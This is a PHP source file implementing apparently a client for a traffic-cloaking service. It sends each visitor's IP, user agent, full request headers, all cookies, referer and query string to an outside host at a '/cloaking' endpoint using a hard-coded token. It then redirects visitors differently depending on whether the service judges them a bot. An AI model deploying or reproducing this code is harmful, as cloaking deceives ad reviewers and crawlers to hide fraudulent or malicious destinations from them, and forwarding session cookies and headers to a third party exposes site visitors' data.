<?php
ob_start();

class BotDetecter
{
    protected static $responce;

    public static function isBot(){
        $responce = self::getResponce();
        return isset($responce['is_bot'])?$responce['is_bot']:true;
    }

    public static function isNotBot(){
        $responce = self::getResponce();
        return isset($responce['is_bot'])?!$responce['is_bot']:false;
    }

    public static function checkAddictions(){
        $version = explode('.', PHP_VERSION);
        $version = (float) $version[0] . '.' . $version[1];
        $ext = get_loaded_extensions();
        if ($version >= 7 && in_array('curl', $ext)) {
            return true;
        } else {
            if (!($version >= 7)) {
                echo ('Unsupported version php. Your version '. $version . "\n");
            }
            if (!(in_array('curl', $ext))) {
                echo ('Php module curl not installed' . "\n");
            }
            die();
        }
    }

    public static function getResponce(){
        self::checkAddictions();
        if(!isset(self::$responce)){
            $flow           = "15Gsea";
            $uniq           = false;
            $useragent      = "";
            $acceptLanguage = null;
            $token          = "s2q5bMNKNN4Hc8YrZhC_V1xlB4UxdVFB";
            $url            = "http://1398289831.gopeerclick.com/cloaking";
            $cookie         = null;
            $cid            = null;
            $referer        = null;
            $get            = json_encode($_GET);

            if (!function_exists('getallheaders')){
                $headers = array ();
                foreach ($_SERVER as $name => $value){
                    if (substr($name, 0, 5) == 'HTTP_'){
                        $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
                    }
                }
            }else{
                $headers = getallheaders();
            }
            if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                if(preg_match("/^.*,.*$/",$ip)){
                    $ip = explode(",",$ip)[0];
                }
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
            if(isset($headers['Cookie']['PHPSESSID'])){
                $uniq = true;
            }
            if(isset($headers['User-Agent'])){
                $useragent = $headers['User-Agent'];
            } else {
                $useragent = $_SERVER['HTTP_USER_AGENT'];
            }
            if(isset($headers['Accept-Language'])){
                $acceptLanguage = $headers['Accept-Language'];
            }
            $cookies = [];
            if(isset($headers['Cookie'])){
                $cookie = $headers['Cookie'];
                $cookie_arr = explode(";",$headers['Cookie']);
                foreach($cookie_arr as $key=>$item){
                    $cookie_arr[$key] = explode("=",$item);
                    $cookies[$cookie_arr[$key][0]] = $cookie_arr[$key][1];
                    if (trim($cookie_arr[$key][0]) == "peerclickcid")
                        $cid = trim($cookie_arr[$key][1]);
                }
            }
            if(isset($_SERVER["HTTP_REFERER"])){
                $referer = $_SERVER["HTTP_REFERER"];
            }

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "{$url}?token={$token}");
            curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);

            $params = [
                "flow"            => $flow,
                "uniq"            => $uniq,
                "useragent"       => $useragent,
                "accept_language" => $acceptLanguage,
                "ip"              => $ip,
                "cookie"          => json_encode($cookies),
                "headers"         => $headers,
                "cid"             => $cid,
                "referer"         => $referer,
                "get_params"      => $get
            ];

            curl_setopt($ch,CURLOPT_POSTFIELDS, http_build_query($params));
            curl_setopt($ch,CURLOPT_POST, true);
            $responce = curl_exec($ch);
            $responce = json_decode($responce,true);
            curl_close($ch);

            if($responce){

                $lifetimeFlow = isset($responce['expires']['flow']) ? $responce['expires']['flow'] : time()+1800;
                $lifetimePeerclickcid = isset($responce['expires']['cid']) ? $responce['expires']['cid'] : time()+1800;

                if ($lifetimeFlow > 0) {
                    setcookie($flow."o", 1, $lifetimeFlow);
                }

                if ( isset($responce['cid']) && $lifetimePeerclickcid > 0) {
                    setcookie("peerclickcid", $responce['cid'], $lifetimePeerclickcid);
                }

                $str = "";
                foreach($_GET as $key=>$item){
                    $str .= "{$key}=$item&";
                }
                $str = preg_replace("/\&$/","",$str);
                if(isset($responce['redirect_to'])){
                    preg_match("/\?/",$responce['redirect_to'],$out);
                    if(isset($out[0]))
                        $responce['redirect_to'] .= "&".$str;
                    else
                        $responce['redirect_to'] .= "?".$str;
                }
                self::$responce = $responce;
            }
        }
        return self::$responce;
    }

    public static function redirectIfNotBot(){
        if(!self::isBot()&&isset(self::$responce['redirect_to'])){
            header('HTTP/1.1 301 Moved Permanently');
            header("Location: ".self::$responce['redirect_to']);
            ob_end_flush();
        }
    }

    public static function redirectIfBot(){
        if(self::isBot()&&isset(self::$responce['redirect_to'])){
            header('HTTP/1.1 301 Moved Permanently');
            header("Location: ".self::$responce['redirect_to']);
            ob_end_flush();
        }
    }
}
